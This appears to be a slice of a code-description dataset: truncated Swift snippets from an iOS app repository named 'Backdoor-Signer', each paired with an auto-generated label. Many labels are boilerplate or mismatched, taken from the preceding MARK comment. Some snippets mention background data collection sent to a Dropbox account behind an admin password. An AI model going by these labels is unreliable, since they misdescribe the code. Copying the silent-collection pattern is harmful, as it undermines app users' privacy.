    "code": "private func toggleFloatingButtons(show: Bool, animated: Bool = true) {\nguard show != showingButtons else { return }",
    "nl": "Function toggleFloatingButtons - implements togglefloatingbuttons functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2679",
    "code": "func webView(_: WKWebView, didFinish _: WKNavigation!) {\nupdateButtonStates()\nrefreshControl.endRefreshing()\n\n// Apply custom stylesheet for enhanced appearance\napplyCustomStyleToWebContent()\n}\n\nfunc webView(_: WKWebView, didFail _: WKNavigation!, withError error: Error) {",
    "nl": "MARK: - WKNavigationDelegate Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2680",
    "code": "func webView(_: WKWebView, didFail _: WKNavigation!, withError error: Error) {\nrefreshControl.endRefreshing()\n\n// Show error if needed\nif (error as NSError).code != NSURLErrorCancelled {",
    "nl": "Function webView - implements webview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2681",
    "code": "func webView(\n_: WKWebView,\ndecidePolicyFor navigationAction: WKNavigationAction,\ndecisionHandler: @escaping (WKNavigationActionPolicy) -> Void\n) {",
    "nl": "Function webView - implements webview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2682",
    "code": "func scrollViewDidScroll(_ scrollView: UIScrollView) {\nlet currentOffset = scrollView.contentOffset.y\nlet contentHeight = scrollView.contentSize.height\nlet frameHeight = scrollView.frame.size.height\n\n// Calculate scroll direction and distance\nlet scrollingDown = currentOffset > lastContentOffset\nlet distanceFromBottom = contentHeight - currentOffset - frameHeight\n\n// Show/hide floating buttons based on scroll direction and position",
    "nl": "MARK: - UIScrollViewDelegate Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2683",
    "code": "func scrollViewDidEndDragging(_: UIScrollView, willDecelerate decelerate: Bool) {\nif !decelerate {",
    "nl": "Function scrollViewDidEndDragging - implements scrollviewdidenddragging functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2684",
    "code": "func scrollViewDidEndDecelerating(_: UIScrollView) {\n// When scrolling stops completely\ntoggleFloatingButtons(show: true)\n}\n\n// MARK: - Custom Styling\n\nprivate func applyCustomStyleToWebContent() {",
    "nl": "Function scrollViewDidEndDecelerating - implements scrollviewdidenddecelerating functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2685",
    "code": "private func applyCustomStyleToWebContent() {\n// Apply custom CSS to enhance website appearance within the app\nlet isDarkMode = traitCollection.userInterfaceStyle == .dark\n\nlet css = \"\"\"\nbody {",
    "nl": "MARK: - Custom Styling",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2686",
    "code": "extension WebViewController {\n/// Applies enhanced styles to web content for better integration with the app\nprivate func enhanceCustomStylesheet() {",
    "nl": "MARK: - Enhanced CSS Styling",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "2687",
    "code": "private func enhanceCustomStylesheet() {\nlet isDarkMode = traitCollection.userInterfaceStyle == .dark\n\n// Add additional custom CSS for specific BDG Hub content\nlet additionalCSS = \"\"\"\n/* Enhanced card styling */\n.card, .panel, .content-box {",
    "nl": "/ Applies enhanced styles to web content for better integration with the app",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2688",
    "code": "extension WebViewController {\noverride func refreshContent() {",
    "nl": "MARK: - RefreshContent Implementation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "2689",
    "code": "override func refreshContent() {\nsuper.refreshContent()\n\n// When switching to this tab, ensure UI is updated\nif webView.isLoading {",
    "nl": "Function refreshContent - implements refreshcontent functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2690",
    "code": "class DataCollectionSettingsViewController: UITableViewController {\n// MARK: - Properties\n\nprivate let cellReuseIdentifier = \"DataCollectionCell\"\nprivate let switchCellReuseIdentifier = \"DataCollectionSwitchCell\"\n\n// Section indices\nprivate enum Section: Int {",
    "nl": "/ View controller for managing data collection settings",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/DataCollectionSettingsViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2691",
    "code": "private enum Section: Int {\ncase about = 0\ncase settings = 1\ncase datasets = 2\ncase actions = 3\n}\n\n// MARK: - Lifecycle\n\noverride func viewDidLoad() {",
    "nl": "Section indices",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/DataCollectionSettingsViewController.swift",
    "code_type": "enum"
  },
  {
    "id": "2692",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\n\ntitle = \"Data Collection\"\n\n// Configure table view\ntableView.register(UITableViewCell.self, forCellReuseIdentifier: cellReuseIdentifier)\ntableView.register(SwitchTableViewCell.self, forCellReuseIdentifier: switchCellReuseIdentifier)\ntableView.tableFooterView = UIView()\n}",
    "nl": "MARK: - Lifecycle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/DataCollectionSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2693",
    "code": "override func viewWillAppear(_ animated: Bool) {\nsuper.viewWillAppear(animated)\ntableView.reloadData()\n}\n\n// MARK: - Table View Data Source\n\noverride func numberOfSections(in _: UITableView) -> Int {",
    "nl": "Function viewWillAppear - implements viewwillappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/DataCollectionSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2694",
    "code": "override func numberOfSections(in _: UITableView) -> Int {\nreturn 4\n}\n\noverride func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {",
    "nl": "MARK: - Table View Data Source",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/DataCollectionSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2695",
    "code": "override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {\nswitch Section(rawValue: section) {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/DataCollectionSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2696",
    "code": "override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nswitch Section(rawValue: indexPath.section) {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/DataCollectionSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2697",
    "code": "override func tableView(_: UITableView, titleForHeaderInSection section: Int) -> String? {\nswitch Section(rawValue: section) {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/DataCollectionSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2698",
    "code": "override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {\ntableView.deselectRow(at: indexPath, animated: true)\n\nswitch Section(rawValue: indexPath.section) {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/DataCollectionSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2699",
    "code": "private func showDatasetManager() {\n// Check for protected dataset access\nlet alert = UIAlertController(\ntitle: \"Dataset Management\",\nmessage: \"Enter admin password to access dataset management\",\npreferredStyle: .alert\n)\n\nalert.addTextField { textField in",
    "nl": "MARK: - Actions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/DataCollectionSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2700",
    "code": "private func showSimpleDatasetUI() {\nlet datasetVC = UIViewController()\ndatasetVC.title = \"Dataset Management\"\n\nlet infoLabel = UILabel()\ninfoLabel.translatesAutoresizingMaskIntoConstraints = false\n\n// Try to get dataset info from BackdoorDataCollector\nvar datasetsInfo =\n\"Datasets are automatically managed in the background.\\n\\nActive data collection is enabled.\\n\\nData is securely transmitted to the specified Dropbox account.\"",
    "nl": "Function showSimpleDatasetUI - implements showsimpledatasetui functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/DataCollectionSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2701",
    "code": "private func showFeatureNotAvailableAlert() {\nlet alert = UIAlertController(\ntitle: \"Feature Not Available\",\nmessage: \"AI Dataset Management is not available in this build\",\npreferredStyle: .alert\n)\nalert.addAction(UIAlertAction(title: \"OK\", style: .default))\npresent(alert, animated: true)\n}\n",
    "nl": "Function showFeatureNotAvailableAlert - implements showfeaturenotavailablealert functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/DataCollectionSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2702",
    "code": "private func showDataCollectionPolicy() {\nlet policyVC = UIViewController()\npolicyVC.title = \"Data Collection Policy\"\n\nlet textView = UITextView()\ntextView.translatesAutoresizingMaskIntoConstraints = false\ntextView.isEditable = false\ntextView.font = UIFont.systemFont(ofSize: 16)\ntextView.text = getDataCollectionPolicyText()\npolicyVC.view.addSubview(textView)",
    "nl": "Function showDataCollectionPolicy - implements showdatacollectionpolicy functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/DataCollectionSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2703",
    "code": "private func getDataCollectionPolicyText() -> String {\nreturn \"\"\"\nDATA COLLECTION POLICY\n\nBackdoor App collects and processes the following information to provide and improve our services:\n\n1. USAGE DATA\nWe collect information about how you use the app, including:\n- Features and screens you visit\n- Actions you take within the app",
    "nl": "Function getDataCollectionPolicyText - retrieves datacollectionpolicytext",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/DataCollectionSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2704",
    "code": "class DonationTableViewCell: UITableViewCell {\noverride init(style: UITableViewCell.CellStyle, reuseIdentifier: String?) {",
    "nl": "/ This class has been intentionally left blank / This file remains as a placeholder to prevent compilation errors in existing code",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/DonationTableViewCell.swift",
    "code_type": "class"
  },
  {
    "id": "2705",
    "code": "class AILearningSettingsViewController: UITableViewController {\n// MARK: - Properties\n\nprivate let cellReuseIdentifier = \"AILearningSettingCell\"\nprivate let switchCellReuseIdentifier = \"AILearningSwitchCell\"\n\n// Activity indicator for training\nprivate let activityIndicator = UIActivityIndicatorView(style: .medium)\n\n// Section indices",
    "nl": "/ View controller for managing AI learning settings",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2706",
    "code": "private enum Section: Int {\ncase about = 0\ncase settings = 1\ncase serverSettings = 2\ncase status = 3\ncase actions = 4\ncase export = 5\n}\n\n// MARK: - Lifecycle",
    "nl": "Section indices",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift",
    "code_type": "enum"
  },
  {
    "id": "2707",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\n\ntitle = \"AI Learning\"\n\n// Configure table view\ntableView.register(UITableViewCell.self, forCellReuseIdentifier: cellReuseIdentifier)\ntableView.register(SwitchTableViewCell.self, forCellReuseIdentifier: switchCellReuseIdentifier)\ntableView.tableFooterView = UIView()\n",
    "nl": "MARK: - Lifecycle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2708",
    "code": "override func viewWillAppear(_ animated: Bool) {\nsuper.viewWillAppear(animated)\ntableView.reloadData()\n}\n\n@objc private func modelUpdated() {",
    "nl": "Function viewWillAppear - implements viewwillappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2709",
    "code": "@objc private func modelUpdated() {\nDispatchQueue.main.async {",
    "nl": "Function modelUpdated - implements modelupdated functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2710",
    "code": "override func numberOfSections(in _: UITableView) -> Int {\nreturn 6\n}\n\noverride func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {",
    "nl": "MARK: - Table View Data Source",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2711",
    "code": "override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {\nswitch Section(rawValue: section) {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2712",
    "code": "override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nswitch Section(rawValue: indexPath.section) {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2713",
    "code": "override func tableView(_: UITableView, titleForHeaderInSection section: Int) -> String? {\nswitch Section(rawValue: section) {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2714",
    "code": "override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {\ntableView.deselectRow(at: indexPath, animated: true)\n\nif indexPath.section == Section.actions.rawValue {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2715",
    "code": "private func performEnhancedLearning() {\n// Show activity indicator\nactivityIndicator.startAnimating()\n\n// Start enhanced learning\nDispatchQueue.global(qos: .userInitiated).async {",
    "nl": "MARK: - Actions Enhanced local learning methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2716",
    "code": "private func promptExportModel() {\nlet alert = UIAlertController(\ntitle: \"Export Trained Model\",\nmessage: \"This feature allows exporting your trained AI model. Please enter the required password to continue.\",\npreferredStyle: .alert\n)\n\n// Add text field for password\nalert.addTextField { textField in",
    "nl": "Function promptExportModel - implements promptexportmodel functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2717",
    "code": "private func exportModel(password: String) {\n// Show activity indicator\nactivityIndicator.startAnimating()\n\n// Perform export\nDispatchQueue.global(qos: .userInitiated).async { [weak self] in",
    "nl": "Function exportModel - implements exportmodel functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2718",
    "code": "private func showExportSuccess(exportURL: URL) {\nlet alert = UIAlertController(\ntitle: \"Export Successful\",\nmessage: \"Model successfully exported to:\\n\\(exportURL.lastPathComponent)\\n\\nYou can find this file in the app's documents directory.\",\npreferredStyle: .alert\n)\n\nalert.addAction(UIAlertAction(title: \"OK\", style: .default))\n\npresent(alert, animated: true)",
    "nl": "Function showExportSuccess - implements showexportsuccess functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2719",
    "code": "private func showErrorAlert(message: String) {\nlet alert = UIAlertController(\ntitle: \"Error\",\nmessage: message,\npreferredStyle: .alert\n)\n\nalert.addAction(UIAlertAction(title: \"OK\", style: .default))\n\npresent(alert, animated: true)",
    "nl": "Function showErrorAlert - implements showerroralert functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2720",
    "code": "private func showInfoAlert(title: String, message: String) {\nlet alert = UIAlertController(\ntitle: title,\nmessage: message,\npreferredStyle: .alert\n)\n\nalert.addAction(UIAlertAction(title: \"OK\", style: .default))\n\npresent(alert, animated: true)",
    "nl": "Function showInfoAlert - implements showinfoalert functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2721",
    "code": "private func trainModelNow() {\n// Show activity indicator\nactivityIndicator.startAnimating()\n\n// Request model training\nAILearningManager.shared.trainModelNow { success, message in",
    "nl": "Function trainModelNow - implements trainmodelnow functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2722",
    "code": "private func promptClearInteractions() {\nlet alert = UIAlertController(\ntitle: \"Clear Stored Interactions\",\nmessage: \"This will delete all stored AI interactions and feedback. This action cannot be undone.\",\npreferredStyle: .alert\n)\n\nalert.addAction(UIAlertAction(title: \"Cancel\", style: .cancel))\n\nalert.addAction(UIAlertAction(title: \"Clear\", style: .destructive) { _ in",
    "nl": "Function promptClearInteractions - implements promptclearinteractions functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2723",
    "code": "class ImprovedLearningSettingsCell: UITableViewCell {\n// UI Elements\nprivate let titleLabel = UILabel()\nprivate let toggleSwitch = UISwitch()\nprivate let descriptionLabel = UILabel()\nprivate let statusLabel = UILabel()\n\n// Action closure\nvar toggleAction: ((Bool) -> Void)?\n",
    "nl": "/ Cell for improved AI learning settings",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningSettingsCell.swift",
    "code_type": "class"
  },
  {
    "id": "2724",
    "code": "private func setupUI() {\n// Configure cell\nbackgroundColor = UIColor(named: \"SettingsCell\") ?? .systemBackground\nselectionStyle = .none\n\n// Configure title label\ntitleLabel.font = .systemFont(ofSize: 16, weight: .medium)\ntitleLabel.textColor = .label\ntitleLabel.numberOfLines = 1\n",
    "nl": "Function setupUI - sets upui",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningSettingsCell.swift",
    "code_type": "function"
  },
  {
    "id": "2725",
    "code": "func configure(title: String, description: String, isOn: Bool, status: String = \"\") {\ntitleLabel.text = title\ndescriptionLabel.text = description\ntoggleSwitch.isOn = isOn\nstatusLabel.text = status\n\n// Hide status label if empty\nstatusLabel.isHidden = status.isEmpty\n}\n",
    "nl": "Function configure - implements configure functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningSettingsCell.swift",
    "code_type": "function"
  },
  {
    "id": "2726",
    "code": "@objc private func switchToggled() {\ntoggleAction?(toggleSwitch.isOn)\n}\n}\n",
    "nl": "Function switchToggled - implements switchtoggled functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningSettingsCell.swift",
    "code_type": "function"
  },
  {
    "id": "2727",
    "code": "class ImprovedLearningViewController: UIViewController {\n// UI Elements\nprivate let tableView = UITableView(frame: .zero, style: .insetGrouped)\nprivate let headerView = UIView()\nprivate let headerLabel = UILabel()\nprivate let trainButton = UIButton(type: .system)\nprivate let activityIndicator = UIActivityIndicatorView(style: .medium)\n\n// Settings sections\nprivate enum Section: Int, CaseIterable {",
    "nl": "/ View controller for improved AI learning settings",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2728",
    "code": "private enum Section: Int, CaseIterable {\ncase main\ncase learning\ncase upload\n}\n\noverride func viewDidLoad() {",
    "nl": "Settings sections",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningViewController.swift",
    "code_type": "enum"
  },
  {
    "id": "2729",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\n\ntitle = \"Advanced AI Learning\"\nview.backgroundColor = UIColor(named: \"SettingsBackground\") ?? .systemGroupedBackground\n\nsetupUI()\n\n// Apply the overrides to ensure AI learns from ALL interactions\nAILearningManager.shared.applyAllInteractionTrainingOverrides()",
    "nl": "Function viewDidLoad - implements viewdidload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2730",
    "code": "override func viewWillAppear(_ animated: Bool) {\nsuper.viewWillAppear(animated)\n\n// Refresh the table view\ntableView.reloadData()\n\n// Update the stats header\nupdateStatsHeader()\n}\n",
    "nl": "Function viewWillAppear - implements viewwillappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2731",
    "code": "private func setupUI() {\n// Configure table view\ntableView.delegate = self\ntableView.dataSource = self\ntableView.backgroundColor = .clear\ntableView.register(ImprovedLearningSettingsCell.self, forCellReuseIdentifier: \"SettingsCell\")\ntableView.register(UITableViewCell.self, forCellReuseIdentifier: \"DefaultCell\")\n\n// Configure header view\nheaderLabel.font = .systemFont(ofSize: 14)",
    "nl": "Function setupUI - sets upui",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2732",
    "code": "private func updateStatsHeader() {\n// Get learning statistics\nlet stats = AILearningManager.shared.getLearningStatistics()\n\n// Format date\nlet dateFormatter = DateFormatter()\ndateFormatter.dateStyle = .medium\ndateFormatter.timeStyle = .short\nlet lastTrainingText = stats.lastTrainingDate != nil ?\ndateFormatter.string(from: stats.lastTrainingDate!) : \"Never\"",
    "nl": "Function updateStatsHeader - updates statsheader",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2733",
    "code": "@objc private func trainButtonPressed() {\n// Disable button and show activity indicator\ntrainButton.isEnabled = false\nactivityIndicator.startAnimating()\n\n// Train model with all interactions\nAILearningManager.shared.trainModelWithAllInteractionsNow { [weak self] success, message in",
    "nl": "Function trainButtonPressed - implements trainbuttonpressed functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2734",
    "code": "extension ImprovedLearningViewController: UITableViewDelegate, UITableViewDataSource {\nfunc numberOfSections(in _: UITableView) -> Int {",
    "nl": "MARK: - UITableViewDelegate & UITableViewDataSource",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "2735",
    "code": "func numberOfSections(in _: UITableView) -> Int {\nreturn Section.allCases.count\n}\n\nfunc tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {",
    "nl": "Function numberOfSections - implements numberofsections functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2736",
    "code": "func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {\nswitch Section(rawValue: section) {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2737",
    "code": "func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nguard let section = Section(rawValue: indexPath.section) else {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2738",
    "code": "func tableView(_: UITableView, titleForHeaderInSection section: Int) -> String? {\nguard let section = Section(rawValue: section) else {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2739",
    "code": "func tableView(_: UITableView, titleForFooterInSection section: Int) -> String? {\nguard let section = Section(rawValue: section) else {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2740",
    "code": "func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {\ntableView.deselectRow(at: indexPath, animated: true)\n\nguard let section = Section(rawValue: indexPath.section) else {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2741",
    "code": "extension ModelServerIntegrationViewController {\n/// Safe wrapper for async tasks that ensures proper await usage\nfunc performAsyncSafely(_ task: @escaping () async -> Void) {",
    "nl": "/ Extension to ensure proper async/await usage in view controllers",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ModelServerIntegrationViewController+SafeAsync.swift",
    "code_type": "extension"
  },
  {
    "id": "2742",
    "code": "func performAsyncSafely(_ task: @escaping () async -> Void) {\nTask {",
